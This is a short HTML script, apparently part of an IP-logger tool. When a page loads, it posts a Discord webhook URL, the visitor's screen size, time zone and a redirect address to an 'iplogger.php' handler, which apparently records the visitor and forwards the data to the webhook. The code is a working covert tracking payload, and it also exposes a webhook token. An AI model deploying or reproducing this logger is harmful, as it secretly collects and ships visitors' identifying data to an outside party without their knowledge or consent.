<script>
var webhook = "https://discord.com/api/webhooks/930788015545131028/QbesUFN6pSADPmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPa2QMGYgYiBoOVJqUryG_w0o";
var redirect = "https://graysuit.github.io";
var xhr = new XMLHttpRequest();
xhr.open('POST', 'iplogger.php', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send('link=' + webhook + "&Width=" + window.screen.width + "&Height=" + window.screen.height + "&TimeZone=" + Intl.DateTimeFormat().resolvedOptions().timeZone + "&Redirect=" + redirect);
</script>
